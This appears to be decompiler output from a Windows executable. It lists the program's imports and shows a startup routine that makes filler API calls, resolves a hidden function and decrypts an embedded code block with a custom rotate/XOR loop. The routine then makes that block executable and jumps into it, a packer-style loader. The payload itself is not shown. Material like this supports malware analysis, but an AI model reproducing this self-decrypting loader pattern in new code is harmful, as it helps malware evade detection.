// subject_data_0000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t436000 = 'n'; // 00436000
CHAR g_t43600A = 'C'; // 0043600A
CHAR g_t436028 = 'Z'; // 00436028
CHAR g_t436035 = 'v'; // 00436035
// subject_idata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw42E000 = ~0x2340431F; // 0042E000
<anonymous> g_t42E026 = <code>; // 0042E026
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__GetMenu = &g_t293E0; // 00429000
<anonymous> * __imp__KillTimer = &g_t293EA; // 00429004
<anonymous> * __imp__GetWindowDC = &g_t293F6; // 00429008
<anonymous> * __imp__RedrawWindow = &g_t29404; // 0042900C
<anonymous> * __imp__ReleaseDC = &g_t29414; // 00429010
<anonymous> * __imp__GetDC = &g_t29420; // 00429014
<anonymous> * __imp__CharNextW = &g_t29428; // 00429018
<anonymous> * __imp__GetParent = &g_t29434; // 0042901C
<anonymous> * __imp__RemoveMenu = &g_t29440; // 00429020
<anonymous> * __imp__EnumThreadWindows = &g_t2944E; // 00429024
<anonymous> * __imp__MessageBoxW = &g_t29462; // 00429028
<anonymous> * __imp__LoadStringW = &g_t29470; // 0042902C
<anonymous> * __imp__DestroyWindow = &g_t2947E; // 00429030
<anonymous> * __imp__UnregisterClassW = &g_t2948E; // 00429034
<anonymous> * __imp__CreateWindowExW = &g_t294A2; // 00429038
<anonymous> * __imp__EqualRect = &g_t294B4; // 0042903C
<anonymous> * __imp__TrackPopupMenu = &g_t294C0; // 00429040
<anonymous> * __imp__LeaveCriticalSection = &g_t294E0; // 00429048
<anonymous> * __imp__GetDriveTypeA = &g_t294F8; // 0042904C
<anonymous> * __imp__FindClose = &g_t29508; // 00429050
<anonymous> * __imp__GetFileAttributesA = &g_t29514; // 00429054
<anonymous> * __imp__CreateFileA = &g_t2952A; // 00429058
<anonymous> * __imp__VirtualProtect = &g_t29538; // 0042905C
<anonymous> * __imp__InterlockedIncrement = &g_t2954A; // 00429060
<anonymous> * __imp__HeapAlloc = &g_t29562; // 00429064
<anonymous> * __imp__GetCPInfo = &g_t2956E; // 00429068
<anonymous> * __imp__LoadLibraryA = &g_t2957A; // 0042906C
<anonymous> * __imp__LocalFree = &g_t2958A; // 00429070
<anonymous> * __imp__GetCommandLineW = &g_t29596; // 00429074
<anonymous> * __imp__GetVersionExW = &g_t295A8; // 00429078
<anonymous> * __imp__InterlockedCompareExchange = &g_t295B8; // 0042907C
<anonymous> * __imp__GetCommandLineA = &g_t295D6; // 00429080
<anonymous> * __imp__HeapFree = &g_t295E8; // 00429084
<anonymous> * __imp__FreeEnvironmentStringsW = &g_t295F4; // 00429088
<anonymous> * __imp__Sleep = &g_t2960E; // 0042908C
<anonymous> * __imp__GetTempPathW = &g_t29616; // 00429090
<anonymous> * __imp__QueryPerformanceCounter = &g_t29626; // 00429094
<anonymous> * __imp__GetSystemTime = &g_t29640; // 00429098
<anonymous> * __imp__FreeResource = &g_t29650; // 0042909C
<anonymous> * __imp__ExitProcess = &g_t29660; // 004290A0
<anonymous> * __imp__DeleteCriticalSection = &g_t2966E; // 004290A4
<anonymous> * __imp__GetLocalTime = &g_t29686; // 004290A8
<anonymous> * __imp__GlobalLock = &g_t29696; // 004290AC
<anonymous> * __imp__HeapCreate = &g_t296A4; // 004290B0
<anonymous> * __imp__GetProcAddress = &g_t296B2; // 004290B4
<anonymous> * __imp__FindResourceExW = &g_t296C4; // 004290B8
<anonymous> * __imp__GetStringTypeA = &g_t296D6; // 004290BC
<anonymous> * __imp__TerminateProcess = &g_t296E8; // 004290C0
<anonymous> * __imp__GetCurrentThreadId = &g_t296FC; // 004290C4
<anonymous> * __imp__SetFileTime = &g_t29712; // 004290C8
<anonymous> * __imp__SetUnhandledExceptionFilter = &g_t29720; // 004290CC
<anonymous> * __imp__InterlockedExchange = &g_t2973E; // 004290D0
<anonymous> * __imp__SetFilePointer = &g_t29754; // 004290D4
<anonymous> * __imp__GetCurrentProcessId = &g_t29766; // 004290D8
<anonymous> * __imp__WriteFile = &g_t2977C; // 004290DC
<anonymous> * __imp__GetFullPathNameW = &g_t29788; // 004290E0
<anonymous> * __imp__GetLocaleInfoW = &g_t2979C; // 004290E4
<anonymous> * __imp__GetFileType = &g_t297AE; // 004290E8
<anonymous> * __imp__RaiseException = &g_t297BC; // 004290EC
<anonymous> * __imp__GetACP = &g_t297CE; // 004290F0
<anonymous> * __imp__SetEvent = &g_t297D8; // 004290F4
<anonymous> * __imp__ReadFile = &g_t297E4; // 004290F8
<anonymous> * __imp__CloseHandle = &g_t297F0; // 004290FC
<anonymous> * __imp__GetEnvironmentStrings = &g_t297FE; // 00429100
<anonymous> * __imp__UnhandledExceptionFilter = &g_t29816; // 00429104
<anonymous> * __imp__OutputDebugStringA = &g_t29832; // 00429108
<anonymous> * __imp__GetFileSize = &g_t29848; // 0042910C
<anonymous> * __imp__GetStdHandle = &g_t29856; // 00429110
<anonymous> * __imp__LoadResource = &g_t29866; // 00429114
<anonymous> * __imp__SizeofResource = &g_t29876; // 00429118
<anonymous> * __imp__GetEnvironmentStringsW = &g_t29888; // 0042911C
<anonymous> * __imp__FreeLibrary = &g_t298A2; // 00429120
<anonymous> * __imp__ResetEvent = &g_t298B0; // 00429124
<anonymous> * __imp__GetModuleHandleW = &g_t298BE; // 00429128
<anonymous> * __imp__VirtualFree = &g_t298D2; // 0042912C
<anonymous> * __imp__lstrcmpA = &g_t298E0; // 00429130
<anonymous> * __imp__SetLastError = &g_t298EC; // 00429134
<anonymous> * __imp__GetTickCount = &g_t298FC; // 00429138
<anonymous> * __imp__OpenEventW = &g_t2990C; // 0042913C
<anonymous> * __imp__GetEnvironmentVariableA = &g_t2991A; // 00429140
<anonymous> * __imp__GetOEMCP = &g_t29934; // 00429144
<anonymous> * __imp__FreeEnvironmentStringsA = &g_t29940; // 00429148
<anonymous> * __imp__LockResource = &g_t2995A; // 0042914C
<anonymous> * __imp__WaitForSingleObject = &g_t2996A; // 00429150
<anonymous> * __imp__GetLastError = &g_t29980; // 00429154
<anonymous> * __imp__GetCurrentProcess = &g_t29990; // 00429158
<anonymous> * __imp__DisableThreadLibraryCalls = &g_t299A4; // 0042915C
<anonymous> * __imp__GetTempFileNameA = &g_t299C0; // 00429160
<anonymous> * __imp__GetCurrentThread = &g_t299D4; // 00429164
<anonymous> * __imp__GetFileAttributesW = &g_t299E8; // 00429168
<anonymous> * __imp__LoadLibraryW = &g_t299FE; // 0042916C
<anonymous> * __imp__GetLocaleInfoA = &g_t29A0E; // 00429170
<anonymous> * __imp__??3@YAXPAX@Z = &g_t29A2C; // 00429178
<anonymous> * __imp__??1exception@@UAE@XZ = &g_t29A3C; // 0042917C
<anonymous> * __imp___adjust_fdiv = &g_t29A54; // 00429180
<anonymous> * __imp___XcptFilter = &g_t29A64; // 00429184
<anonymous> * __imp___unlock = &g_t29A72; // 00429188
<anonymous> * __imp___cexit = &g_t29A7C; // 0042918C
<anonymous> * __imp____dllonexit = &g_t29A86; // 00429190
<anonymous> * __imp____p__commode = &g_t29A94; // 00429194
<anonymous> * __imp___onexit = &g_t29AA4; // 00429198
<anonymous> * __imp__wcschr = &g_t29AAE; // 0042919C
<anonymous> * __imp__malloc = &g_t29AB8; // 004291A0
<anonymous> * __imp__realloc = &g_t29AC2; // 004291A4
<anonymous> * __imp__memcpy = &g_t29ACC; // 004291A8
<anonymous> * __imp__CoCreateInstance = &g_t29AE0; // 004291B0
word32 g_dw42921C = 0x000293E0; // 0042921C
word32 g_dw429220 = 168938; // 00429220
word32 g_dw429224 = 0x000293F6; // 00429224
word32 g_dw429228 = 0x00029404; // 00429228
word32 g_dw42922C = 0x00029414; // 0042922C
word32 g_dw429230 = 0x00029420; // 00429230
word32 g_dw429234 = 169000; // 00429234
word32 g_dw429238 = 0x00029434; // 00429238
word32 g_dw42923C = 0x00029440; // 0042923C
word32 g_dw429240 = 0x0002944E; // 00429240
word32 g_dw429244 = 0x00029462; // 00429244
word32 g_dw429248 = 0x00029470; // 00429248
word32 g_dw42924C = 169086; // 0042924C
word32 g_dw429250 = 169102; // 00429250
word32 g_dw429254 = 169122; // 00429254
word32 g_dw429258 = 0x000294B4; // 00429258
word32 g_dw42925C = 0x000294C0; // 0042925C
word32 g_dw429264 = 0x000294E0; // 00429264
word32 g_dw429268 = 0x000294F8; // 00429268
word32 g_dw42926C = 0x00029508; // 0042926C
word32 g_dw429270 = 169236; // 00429270
word32 g_dw429274 = 0x0002952A; // 00429274
word32 g_dw429278 = 169272; // 00429278
word32 g_dw42927C = 169290; // 0042927C
word32 g_dw429280 = 0x00029562; // 00429280
word32 g_dw429284 = 169326; // 00429284
word32 g_dw429288 = 169338; // 00429288
word32 g_dw42928C = 0x0002958A; // 0042928C
word32 g_dw429290 = 169366; // 00429290
word32 g_dw429294 = 0x000295A8; // 00429294
word32 g_dw429298 = 169400; // 00429298
word32 g_dw42929C = 0x000295D6; // 0042929C
word32 g_dw4292A0 = 169448; // 004292A0
word32 g_dw4292A4 = 169460; // 004292A4
word32 g_dw4292A8 = 0x0002960E; // 004292A8
word32 g_dw4292AC = 169494; // 004292AC
word32 g_dw4292B0 = 0x00029626; // 004292B0
word32 g_dw4292B4 = 0x00029640; // 004292B4
word32 g_dw4292B8 = 0x00029650; // 004292B8
word32 g_dw4292BC = 0x00029660; // 004292BC
word32 g_dw4292C0 = 0x0002966E; // 004292C0
word32 g_dw4292C4 = 169606; // 004292C4
word32 g_dw4292C8 = 0x00029696; // 004292C8
word32 g_dw4292CC = 169636; // 004292CC
word32 g_dw4292D0 = 0x000296B2; // 004292D0
word32 g_dw4292D4 = 169668; // 004292D4
word32 g_dw4292D8 = 169686; // 004292D8
word32 g_dw4292DC = 0x000296E8; // 004292DC
word32 g_dw4292E0 = 0x000296FC; // 004292E0
word32 g_dw4292E4 = 0x00029712; // 004292E4
word32 g_dw4292E8 = 0x00029720; // 004292E8
word32 g_dw4292EC = 169790; // 004292EC
word32 g_dw4292F0 = 169812; // 004292F0
word32 g_dw4292F4 = 0x00029766; // 004292F4
word32 g_dw4292F8 = 0x0002977C; // 004292F8
word32 g_dw4292FC = 0x00029788; // 004292FC
word32 g_dw429300 = 0x0002979C; // 00429300
word32 g_dw429304 = 169902; // 00429304
word32 g_dw429308 = 169916; // 00429308
word32 g_dw42930C = 169934; // 0042930C
word32 g_dw429310 = 169944; // 00429310
word32 g_dw429314 = 169956; // 00429314
word32 g_dw429318 = 169968; // 00429318
word32 g_dw42931C = 169982; // 0042931C
word32 g_dw429320 = 170006; // 00429320
word32 g_dw429324 = 0x00029832; // 00429324
word32 g_dw429328 = 0x00029848; // 00429328
word32 g_dw42932C = 170070; // 0042932C
word32 g_dw429330 = 0x00029866; // 00429330
word32 g_dw429334 = 170102; // 00429334
word32 g_dw429338 = 0x00029888; // 00429338
word32 g_dw42933C = 0x000298A2; // 0042933C
word32 g_dw429340 = 170160; // 00429340
word32 g_dw429344 = 170174; // 00429344
word32 g_dw429348 = 0x000298D2; // 00429348
word32 g_dw42934C = 0x000298E0; // 0042934C
word32 g_dw429350 = 170220; // 00429350
word32 g_dw429354 = 0x000298FC; // 00429354
word32 g_dw429358 = 0x0002990C; // 00429358
word32 g_dw42935C = 0x0002991A; // 0042935C
word32 g_dw429360 = 0x00029934; // 00429360
word32 g_dw429364 = 0x00029940; // 00429364
word32 g_dw429368 = 170330; // 00429368
word32 g_dw42936C = 0x0002996A; // 0042936C
word32 g_dw429370 = 0x00029980; // 00429370
word32 g_dw429374 = 0x00029990; // 00429374
word32 g_dw429378 = 170404; // 00429378
word32 g_dw42937C = 0x000299C0; // 0042937C
word32 g_dw429380 = 0x000299D4; // 00429380
word32 g_dw429384 = 0x000299E8; // 00429384
word32 g_dw429388 = 0x000299FE; // 00429388
word32 g_dw42938C = 170510; // 0042938C
word32 g_dw429394 = 0x00029A2C; // 00429394
word32 g_dw429398 = 170556; // 00429398
word32 g_dw42939C = 170580; // 0042939C
word32 g_dw4293A0 = 0x00029A64; // 004293A0
word32 g_dw4293A4 = 170610; // 004293A4
word32 g_dw4293A8 = 170620; // 004293A8
word32 g_dw4293AC = 170630; // 004293AC
word32 g_dw4293B0 = 0x00029A94; // 004293B0
word32 g_dw4293B4 = 170660; // 004293B4
word32 g_dw4293B8 = 170670; // 004293B8
word32 g_dw4293BC = 170680; // 004293BC
word32 g_dw4293C0 = 0x00029AC2; // 004293C0
word32 g_dw4293C4 = 170700; // 004293C4
word32 g_dw4293CC = 170720; // 004293CC
// subject_text_0002.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004282D2: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	struct Eq_3 * ebp;
	Eq_2 tLoc18;
	GetACP();
	GetCurrentProcessId();
	GetCurrentThreadId();
	int32 eax_39 = GetProcAddress(LoadLibraryA(&g_t436000), &g_t436028)();
	GetACP();
	fn0042846C(&g_dw42E000, 0x70EC, eax_39);
	Eq_38 eax_70 = CreateFileA(&g_t436035, 0x60000000, 0x02, null, 0x03, 133, null);
	GetACP();
	GetCurrentThreadId();
	GetCommandLineW();
	GetOEMCP();
	GetFileSize(eax_70, null);
	VirtualProtect(&g_dw42E000, 0x70EC, 0x40, &tLoc18);
	GetCommandLineW();
	tLoc18 = (Eq_2) 0x20000000;
	Eq_38 eax_118 = CreateFileA(&g_t43600A, tLoc18, 0x06, null, 0x03, 166, null);
	ebp->tFFFFFFFC = eax_118;
	Eq_2 eax_122;
	g_t42E026();
	return eax_122;
}

// 0042846C: void fn0042846C(Stack (ptr32 word32) dwArg04, Stack uint32 dwArg08, Stack int32 dwArg0C)
// Called from:
//      Win32CrtStartup
void fn0042846C(word32 * dwArg04, uint32 dwArg08, int32 dwArg0C)
{
	word32 * edx_18 = dwArg04;
	uint32 edi_20 = dwArg08 >> 0x02;
	do
	{
		*edx_18 -= dwArg0C;
		*edx_18 = __rol<word32,byte>(*edx_18, 88);
		*edx_18 = *edx_18 ^ dwArg0C;
		*edx_18 += dwArg0C;
		*edx_18 -= dwArg0C;
		*edx_18 = *edx_18 ^ dwArg0C;
		*edx_18 += 593360321;
		*edx_18 -= 1304055853;
		++edx_18;
		--edi_20;
	} while (edi_20 != 0x00);
}

